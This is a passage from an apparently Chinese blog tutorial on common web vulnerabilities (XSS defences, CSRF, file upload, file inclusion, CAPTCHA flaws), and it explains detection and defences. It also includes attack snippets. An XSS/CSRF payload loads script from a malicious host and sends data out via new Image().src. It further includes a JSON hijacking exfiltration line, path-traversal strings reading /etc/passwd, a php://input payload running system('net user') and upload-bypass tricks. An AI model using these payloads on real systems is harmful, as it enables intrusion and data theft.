将shellcode保存在其他服务器中，然后再用script标签来动态加载。除此之外，还可以通过基于DOM的方法创建和插入结点，把代码注入到网页中。这两种方式在利用中都有相应的演示。</p><p><strong>使用window.location.hash</strong></p><p>​    即DOM型。location是JS管理地址栏的内置对象，location.hash则是用来获取或设置页面的标签值。相关的简单的利用已有示例，至于DOM型的XSS会有进一步的笔记。</p><h3 id="三、检测方法-1"><a href="#三、检测方法-1" class="headerlink" title="三、检测方法"></a>三、检测方法</h3><p>​    寻找脚本程序的输出显示代码，搜索关键字，显示输出那个变量，跟踪变量是否被过滤。</p><p>​    可以先输入一些内容，页面返回之后，可以查看网页源代码，搜索内容关键字看看是不是直接返回在页面的HTML代码中。</p><h3 id="四、防御方法-1"><a href="#四、防御方法-1" class="headerlink" title="四、防御方法"></a>四、防御方法</h3><p><strong>1、调用函数</strong></p><p>​    对于用户提交的数据可以通过调用函数进行过滤，htmlspecialchars()函数将输出的内容进行HTML的编码，效果最好；str_replace()函数可以将指定的字符串转换为其他字符串的，但是会被绕过。</p><p><strong>2、使用XSS Filter</strong></p><p><strong>（1）输入过滤</strong></p><p>​    输入验证（客户端）：前端JS过滤，如检测最大长度、是否只有合法字符、格式是否符合要求、数字是否在指定的范围内。缺点就是容易被修改掉。</p><p>​    数据消毒（服务器端）：过滤敏感字符（可以和SQL注入的一同过滤），如&lt; &gt; javascript ‘ “ &amp; # expression等。</p><p><strong>（2） 输出编码（服务器端）</strong></p><p>​    可以使用HTML编码（PHP的htmlspecialchars()函数、ASP的Server.HTMLEncode()函数、ASP.NET的Server.HtmlEncode()函数），用对应的HTML实体替代字面量字符，此时浏览器会将恶意代码当作HTML文档的内容而不是结构加以处理。</p><p>常见恶意字符的HTML编码（显示、实体名字、实体编号）：</p><p>&lt;  &lt;;  &amp;#60；</p><p>>  &gt;  &amp;#62；</p><p>&amp;  &amp;  &amp;#38；</p><p>“  “  &amp;#34；</p><p>‘          ‘</p><p><strong>3、白名单和黑名单结合</strong></p><p><strong>4、Noscript</strong></p><p>​    Firefox的一款免费的开源插件，默认禁止所有脚本，但是可以通过自定义设置允许通过的脚本。</p><p><strong>5、Anti_XSS</strong></p><p>​    提供大量的编码函数用于处理用户的输入，实现白名单机制和输出转义。</p><p><strong>6、HttpOnly</strong></p><p>​    攻击者通过XSS漏洞执行JS中的document.cookie方法来窃取用户的cookie信息。Web应用程序在Set-Cookie时将其属性设为HttpOnly即可避免Cookie被客户端JS存取，也可以保护用户的Cookie信息不被盗取。</p><p>​    PHP设置HttpOnly的方法：</p><p>​    （1） 修改php.ini文件，设置其值为1或TRUE；</p><p>​    （2） setcookie()函数和setrawcookie()函数的第七个参数；</p><p>​    （3）在PHP代码中开启。</p><p><strong>7、Web安全编码规范</strong></p><p>​    对敏感字符转义、URL属性进行相应的规定等。</p><p><strong>8、尽量使用WAF</strong></p><p><strong>9、防御DOM型XSS</strong></p><p>DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：</p><p>（1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</p><p>（2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br></pre></td></tr></table></figure><p>则进行JS编码。</p><h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><h3 id="一、基本概念-2"><a href="#一、基本概念-2" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>　　跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。</p><p><strong>成因</strong></p><p>由于程序员的不严谨导致Web应用程序存在漏洞</p><p>Web浏览器对Cookie和HTTP身份验证等会话信息的处理存在缺陷</p><p><strong>漏洞利用的前提</strong></p><p>用户已经完成身份认证</p><p>新请求的提交不需要重新身份认证或确认机制</p><p>攻击者必须了解Web APP请求的参数构</p><p>用户会被吸引去点击链接</p><p><strong>CSRF与XSS的区别与关系</strong></p><p>XSS主要利用用户对站点的信任，而CSRF主要是利用站点对已知身份认证的信任。换句话说，XSS是用户自己点击链接来访问相应的网页的，而CSRF是在用户并不知情的情况下来提交请求的。另外，两者的产生的原因也不一样，CSRF的是因为采用了隐式的认证方式，而XSS的是因为对用户输入没有进行有效的过滤。</p><p>两者均利用用户的会话执行某些操作；若一个站点存在XSS漏洞，则很大可能也存在CSRF漏洞；若CSRF的恶意代码存在于第三方的站点，即使能有效地过滤用户的输入而防止XSS，也未必能防御CSRF。</p><p><strong>攻击方式</strong></p><p>GET型与POST型CSRF：主要取决于相应操作对提交方式的限制，其原理都是事先构造出一个恶意的请求，然后诱导用户点击或访问，从而假借用户身份完成相应的操作。另外，有些POST型CSRF也可能会利用javascript进行自动提交表单完成操作。</p><p>Flash型CSRF：通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如:</p><p>Flash跨域权限管理文件设置为允许所有主机/域名跨域对本站进行读写数据：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF。</p><p>CSRF蠕虫：CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如：某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大！</p><h3 id="二、CSRF攻击获取数据的方法"><a href="#二、CSRF攻击获取数据的方法" class="headerlink" title="二、CSRF攻击获取数据的方法"></a>二、CSRF攻击获取数据的方法</h3><p>要获取的关键数据：用户 id、用户昵称、用户 email、用户个人页面地址等。</p><p>同域内 CSRF 攻击获取数据几乎没任何限制。</p><p>跨域 CSRF 攻击获取数据的几种方法总结如下：</p><p><strong>1、结合XSS 组合漏洞</strong></p><p>利用XSS 获取数据，如之前关于XSS文章做的三方的演示，使用目标站点上的XSS 漏洞：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">src</span>=<span class="string">‘http://目标站点/search.php?k</span>=<span class="string">“</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://恶意站点/get.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>’&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中get.js 的代码为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//use DOM method to get your data</span></span><br><span class="line"><span class="keyword">new</span> Image(). src=‘http:<span class="comment">//恶意站点/a.php?data=‘+data;</span></span><br></pre></td></tr></table></figure><p>恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。</p><p><strong>2、JSON Hijacing</strong></p><p>目标站点使用了 JSON 数据传输用户私有数据，其中包含需要的唯一标识等信息。</p><p>相关代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="function"><span class="keyword">function</span> <span class="title">hijack</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line"><span class="comment">//use DOM method to get your data</span></span><br><span class="line"><span class="keyword">new</span> Image().src=<span class="string">"http://192.168.1.2/JSONHiJack.asp?hi="</span>+<span class="built_in">escape</span>(data);</span><br><span class="line">&#125;&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script src=http:/</span><span class="regexp">/api.fanfou.com/</span>private_messages/inbox.json?callback=hijack&amp;count=<span class="number">2</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>3、Flash AsctionScript（crossdomain.xml）</strong></p><p>前提是目标站点下存在crossdomain.xml文件，且其配置允许其他域的 AS脚本进行跨域请求。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>相关代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flash.net.*; </span><br><span class="line">var _l = new URLLoader(new URLRequest(“http://目标站点/<span class="string">"));</span></span><br><span class="line"><span class="string">_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);</span></span><br><span class="line"><span class="string">_l.load();</span></span><br></pre></td></tr></table></figure><p><strong>4、服务端代理技术</strong></p><h3 id="三、检测方法-2"><a href="#三、检测方法-2" class="headerlink" title="三、检测方法"></a>三、检测方法</h3><p>最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。另外还需要确认数据包中确实没有含有token字样，即使有也尝试去掉再发包看是否是进行有效的CSRF校验即可。</p><p>一些专门针对 CSRF 漏洞进行检测的工具，如CSRFTester，CSRF Request Builder 等。</p><p>以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p><h3 id="四、防御方法-2"><a href="#四、防御方法-2" class="headerlink" title="四、防御方法"></a>四、防御方法</h3><p><strong>1、 服务端的防御</strong></p><p>主要有 5 种策略：验证 HTTP的Referer字段、在请求地址中添加 token 并验证、在 HTTP 头中自定义属性并验证、使用POST替代GET等。</p><p>（1）、验证 HTTP的Referer字段，在 HTTP 头的Referer字段记录了该 HTTP 请求的来源地址。顺便解决了非法盗链、站外提交等问题。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。</p><p>（2）、在请求地址中添加 token 并验证，可以在 HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。抵御 CSRF 攻击的关键在于：在请求中加入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。</p><p>（3）、在 HTTP 头中自定义属性并验证，也是使用 token 并进行验证，但并不是把 token以参数的形式置于 HTTP 请求而是放到 HTTP 头中自定义的属性里。通过XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把token 值放入其中。这样解决了前一种方法在请求中加入 token 的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会通过 Referer 泄露到其他网站。</p><p>（4）、严格区分好 POST 与 GET 的数据请求，尽量使用POST来替代GET，如在 asp 中不要使用 Request 来直接获取数据。同时建议不要用 GET 请求来执行持久性操作。</p><p>（5）、使用验证码或者密码确认方式，缺点是用户体验差。</p><p><strong>2、 用户端的防御</strong></p><p>用户的安全意识与良好的上网习惯。</p><p><strong>3、 安全设备的防御</strong></p><p>有些厂商的安全产品能基于硬件层面对HTTP 头部的 Referer 字段内容进行检查来快速准确的识别 CSRF 攻击。</p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="一、基本概念-3"><a href="#一、基本概念-3" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>文件上传漏洞是指由于服务器端对于用户上传部分的控制不严格导致攻击者可以上传一个恶意的文件到服务器。简单点说，就是用户直接或者通过各种绕过方式将WebShell上传到服务器中进而执行利用。</p><p><strong>成因</strong></p><p>导致文件上传的漏洞的原因较多，主要包括以下几类：</p><p>服务器配置不当</p><p>开源编辑器上传漏洞</p><p>本地文件上传限制被绕过</p><p>过滤不严或被绕过</p><p>文件解析漏洞导致文件执行</p><p>文件路径截断</p><p>服务器配置不当</p><h3 id="二、文件上传攻击分类"><a href="#二、文件上传攻击分类" class="headerlink" title="二、文件上传攻击分类"></a>二、文件上传攻击分类</h3><p><strong>1、轻量级检测绕过攻击</strong></p><p>（1）绕过javascript 对扩展名的检测：</p><p>使用Burpsuite等反向代理工具直接POST数据包到服务端，绕过前端检测，如DVWA中的绕过示例。</p><p>（2）绕过服务端对http request 包MIME 类型检测：</p><p>使用Burpsuite等反向代理工具伪造POST 数据包到服务端，绕过MIME检测，如DVWA中的绕过示例。</p><p><strong>2、文件内容检测绕过攻击</strong></p><p>文件加载测试绕过：对文件进行代码注入再配合任意解析调用/漏洞。</p><p><strong>3、上传攻击框架漏洞分层以及路径/扩展名检测绕过攻击</strong></p><table><thead><tr><th>轻量级检测绕过攻击</th><th></th></tr></thead><tbody><tr><td>绕过javascript 对扩展名的检测</td><td>代码层漏洞</td></tr><tr><td>绕过服务端对http request 包MIME 类型检测</td><td>代码层漏洞</td></tr></tbody></table><table><thead><tr><th>路径、扩展名检测绕过攻击</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>黑名单绕过</td><td>白名单绕过</td><td></td><td></td></tr><tr><td>文件名大小写绕过名单列表绕过特殊文件名绕过0x00截断绕过.htaccess文件攻击PHP文件包含漏洞Apache解析漏洞IIS解析漏洞Nginx解析漏洞</td><td>代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞应用层漏洞应用层漏洞应用层漏洞</td><td>0x00截断绕过PHP文件包含漏洞IIS解析漏洞Nginx解析漏洞</td><td>代码层漏洞代码层漏洞应用层漏洞应用层漏洞</td></tr></tbody></table><p><strong>4、文件内容检测绕过攻击</strong></p><p>文件加载绕过 (代码层漏洞)</p><p>攻击手法与环节如图：</p><p><img src="/2019/01/30/常见Web漏洞类型/1.png" alt="文件上传攻击思路图"></p><h3 id="三、上传文件中的解析攻击"><a href="#三、上传文件中的解析攻击" class="headerlink" title="三、上传文件中的解析攻击"></a>三、上传文件中的解析攻击</h3><p><strong>1、直接解析（几乎没有防御）</strong></p><p>比如直接上传一个扩展名是.php 的文件，只需要简单地绕过客户端javascript 检测或者服务端MIME 类型检测就行了。</p><p><strong>2、配合解析(有一定程度的防御)</strong></p><p>可以理解为先将代码注入到服务器上，上传一个带有一句话木马的图片或文件，等待一个解析的配合来实现攻击。</p><p>(1)、本地文件包含解析：主要是PHP本地文件包含</p><p>(2)、.htaccess文件解析</p><p>(3)、Web应用程序解析漏洞以及其原理：</p><p><strong>1.Apache 解析漏洞：</strong></p><p>解析： test.php.abc（其中abc为任意不属于黑名单且也不属于Apache解析白名单的名称）</p><p>描述：一个文件名为x1.x2.x3的文件，Apache 会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样         一直往前尝试，直到遇到一个能解析的扩展名为止。</p><p><strong>2.IIS 解析漏洞：</strong></p><p>解析：test.asp/abc 或 test.asp;abc 名 或 abc/def.php （其中abc、def都为任意文件名）</p><p>描述：IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”会优先按asp来解析；IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL 后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。</p><p><strong>3.Nginx 解析漏洞：</strong></p><p>解析：abc/def.php 或 abc%00.php （其中abc、def都为任意文件名）</p><p>描述：目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/abc.php 的解析漏洞，如原本文件名是test.jpg则可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p><p><strong>4.解析漏洞总结：</strong></p><p>Apache的扩展名顺序解析漏洞：Apache自身的漏洞</p><p>IIS的asp 解析漏洞：IIS自身的漏洞</p><p>Nginx的%00 解析漏洞：Nginx自身的漏洞</p><p>php-cgi的默认配置漏洞：这类以CGI 形式调用php的web 应用程序主要出现在IIS和Nginx；而Apache 通常是以module 的形式去调用php，所以很少出现该类型漏洞。</p><h3 id="四、检测方法"><a href="#四、检测方法" class="headerlink" title="四、检测方法"></a>四、检测方法</h3><p>简单点的方法就是直接上传各种类型的文件，再通过Burpsuite修改各个可以绕过的检测内容来检测。</p><h3 id="五、防御方法"><a href="#五、防御方法" class="headerlink" title="五、防御方法"></a>五、防御方法</h3><p>简单的防御方法为：获取文件扩展名进行白名单对比，然后对文件进行重命名。当然若存在解析漏洞等容易被绕过，具体点的防御方法如下：</p><p>1、客户端JavaScript检测：通常为检测文件扩展名)</p><p>2、服务端MIME 类型检测：检测Content-Type内容)</p><p>3、服务端目录路径检测：检测跟path参数相关的内容</p><p>4、服务端文件扩展名检测：检测跟文件extension 相关的内容</p><p>（1） 黑名单检测：</p><ol><li><p>文件名大小写绕过：如 AsP，pHp。</p></li><li><p>名单列表绕过：用黑名单里没有的名单，如 asa 或 cer 等。</p></li><li><p>特殊文件名绕过：比如发送的 http 包里把文件名改成 test.asp. 或 test.asp (后面为空格)，这种命名方式在 Windows系统里是不能直接修改的，需要在Burpsuite等代理中进行修改，然后绕过验证后，会被Windows系统自动去掉后面的点和空格，但也只能用在Windows系统中。</p></li><li><p>0x00 截断绕过</p></li><li><p>双扩展名解析绕过攻击：</p></li></ol><p>(1)基于Web服务的解析逻辑：如果上传一个文件名为help.asp.123，扩展名123 不在扩展名黑名单中也没在Apache 可解析扩展名列表中，此时会向前搜寻下一个可解析的扩展名，若搜寻到.php，则会以php 执行。</p><p>(2) 基于Web服务的解析方式：如果在Apache的conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是test2.php.jpg也会以php 来执行。</p><ol start="6"><li><p>危险解析绕过攻击：基于Web服务的解析方式：如果在Apache 的conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是jpg，一样能以php 方式执行。</p></li><li><p>.htaccess 文件攻击：配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测。</p></li><li><p>解析调用/漏洞绕过：直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p></li></ol><p>（2） 白名单检测：</p><ol><li><p>0x00 截断绕过：如test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑漏洞进行攻击</p></li><li><p>解析调用/漏洞绕过：直接配合上传一个代码注入过的白名单文件，再利用解析调用/漏洞</p></li><li><p>.htaccess文件攻击：无论是黑名单还是白名单都可以直接攻击.htaccess 文件</p></li></ol><p>如果PHP 安全没配置好，就可以通过move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的，这样就能任意定义解析名单了。</p><p>5、服务端文件内容检测(检测内容是否合法或含有恶意代码) ：</p><p>（1）文件幻数检测：</p><p>主要是检测文件内容开始处的文件幻数，要绕过的话需要在文件开头写上检测的值，比如图片类型的文件幻数如下：</p><p>JPG文件：</p><p><img src="/2019/01/30/常见Web漏洞类型/3.png" alt="jpg文件幻数"></p><p>GIF文件：</p><p><img src="/2019/01/30/常见Web漏洞类型/4.png" alt="gif文件幻数"></p><p>PNG文件：</p><p><img src="/2019/01/30/常见Web漏洞类型/5.png" alt="png文件幻数"></p><p>然后在文件幻数后面加上代码即可。</p><p>（2）文件相关信息检测：</p><p>图像文件相关信息检测常用的就是getimagesize()函数，需要把文件头部分伪造好，就是在幻数的基础上还加了一些文件信息，结构如下：</p><p>GIF89a </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(...some binary data for image...) </span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure><p>（3）文件加载检测：</p><p>一般是调用API 或函数去进行文件加载测试，常见的是图像渲染测试，甚至是进行二次渲染（过滤效果几乎最强）。</p><p>对渲染/加载测试的攻击方式：代码注入绕过，可以用图像处理软件对一张图片进行代码注入，但文件结构是完整的，渲染测试基本上都能绕过。用winhex查看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区。</p><p>对二次渲染的攻击方式：攻击文件加载器自身，常见的就是溢出攻击，上传恶意文件后服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出；二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。</p><p>示例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">image_gd_open</span><span class="params">(file, extension)</span> </span>&#123; </span><br><span class="line">    extension = str_replace(<span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, extension); </span><br><span class="line">    open_func = <span class="string">'imageCreateFrom'</span>. extension; <span class="comment">//函数名变成imageCreateFrompng  之类 </span></span><br><span class="line">    <span class="keyword">if</span> (!function_exists($open_func)) &#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> open_func(file); <span class="comment">//变成imagecreatefrompng('/tmp/php0lbTOn') </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="一、基本概念-4"><a href="#一、基本概念-4" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>简单地说，就是在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。</p><p>这里主要针对PHP语言。</p><p><strong>PHP中的文件包含函数</strong></p><p>include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。</p><p>include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</p><p>require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。</p><p>require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</p><p><strong>文件包含漏洞的一般特征</strong></p><p>?page=a.php</p><p>?home=a.html</p><p>?file=content</p><p><strong>目录遍历（Directory traversal）和文件包含（File include）的一些区别</strong></p><p>目录遍历是可以读取web根目录以外的其他目录，根源在于web application的路径访问权限设置不严，针对的是本系统。</p><p>文件包含是通过include函数将web根目录以外的目录的文件被包含进来，分为LFI本地文件包含和RFI远程文件包含。</p><p><strong>几种经典的测试方法</strong></p><p>?file=../../../../../etc/passwdd</p><p>?page=file:///etc/passwd</p><p>?home=main.cgi</p><p>?page=<a href="http://www.a.com/1.php" target="_blank" rel="noopener">http://www.a.com/1.php</a></p><p><a href="http://1.1.1.1/../../../../dir/file.txt" target="_blank" rel="noopener">http://1.1.1.1/../../../../dir/file.txt</a></p><p>（通过多个../可以让目录回到根目录中然后再进入目标目录）</p><p><strong>编码绕过字符过滤</strong></p><p>可以使用多种编码方式进行绕过</p><p>%00嵌入任意位置</p><p>.的利用</p><h3 id="二、文件包含漏洞的利用技巧"><a href="#二、文件包含漏洞的利用技巧" class="headerlink" title="二、文件包含漏洞的利用技巧"></a>二、文件包含漏洞的利用技巧</h3><p>包含漏洞上传技巧：</p><p>一般将一句话木马和图片进行绑定上传。</p><p>包含读文件：</p><p>如<a href="http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php" target="_blank" rel="noopener">http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php</a></p><p>包含写文件：</p><p>构造URL：<a href="http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://input，并且提交POST数据为：" target="_blank" rel="noopener">http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://input，并且提交POST数据为：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&apos;net user&apos;);?&gt;</span><br></pre></td></tr></table></figure><p>等</p><p>包含日志文件：</p><p>当存在PHP本地文件包含漏洞，但无法上传正常文件时，可以利用Apache日志文件。Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中，例如：</p><p><a href="http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log" target="_blank" rel="noopener">http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log</a></p><p>PHP内置的协议：</p><p><img src="/2019/01/30/常见Web漏洞类型/2.png" alt="php伪协议"></p><h3 id="三、检测方法-3"><a href="#三、检测方法-3" class="headerlink" title="三、检测方法"></a>三、检测方法</h3><p>找到有包含函数的页面，对函数内容进行替换查看结果；</p><p>可以使用工具来代替手工的过程，如Kadimus、Burpsuite的插件LFI scanner checks等；</p><p>白盒测试时，可以在源代码中查看allow_url_fopen、allow_url_include等敏感函数是否开启。</p><h3 id="四、防御方法-3"><a href="#四、防御方法-3" class="headerlink" title="四、防御方法"></a>四、防御方法</h3><p>1、严格判断包含中的参数是否外部可控。</p><p>2、路径限制，限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：“../”。</p><p>3、基于白名单的包含文件验证，验证被包含的文件是否在白名单中。</p><p>4、尽量不要使用动态包含，可以在需要包含的页面固定写好，如：“include(“head.php”)”。</p><p>5、可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。</p><h2 id="不安全的验证码"><a href="#不安全的验证码" class="headerlink" title="不安全的验证码"></a>不安全的验证码</h2><h3 id="一、基本概念-5"><a href="#一、基本概念-5" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>验证码问题归类为逻辑漏洞类问题，通常是开发者编写代码时存在设计缺陷、可导致某些特殊情况使得验证码可被绕过，从而使得验证码的防御机制形同虚设。</p><p><strong>原理过程</strong></p><p>1.客户端发起一个请求</p><p>2.服务端响应并创建一个新的 SessionID 同时生成一个随机验证码</p><p>3.服务端将验证码和 SessionID 一并返回给客户端</p><p>4.客户端提交验证码连同 SessionID 给服务端</p><p>5.服务端验证验证码同时销毁当前会话，返回给客户端结果</p><h3 id="二、验证码的安全问题"><a href="#二、验证码的安全问题" class="headerlink" title="二、验证码的安全问题"></a>二、验证码的安全问题</h3><p>客户端问题：</p><p>1、 客户端生成验证码：验证码由客户端 JS生成并且仅仅在客户端用JS验证。</p><p>2、 验证码输出客户端：输出在HTML中，不应该把验证码的内容发送到客户端 cookie 或输出到response headers的其他字段中。</p><p>3、 验证码输出在 cookie 中：有些系统默认不显示验证码，而是在用户校验错误一定次数之后再出现。那如何判断用户已经错误几次了呢？若是如下判断：        </p><p>（1）在 cookie 中写入一个标记，比如 loginErr = 1，后续错误累加</p><p>（2）在 session 中写入一个标记，例如 loginErr = 1，后续错误累加 </p><p>这样问题在于，要是攻击者不带 Cookie 提交 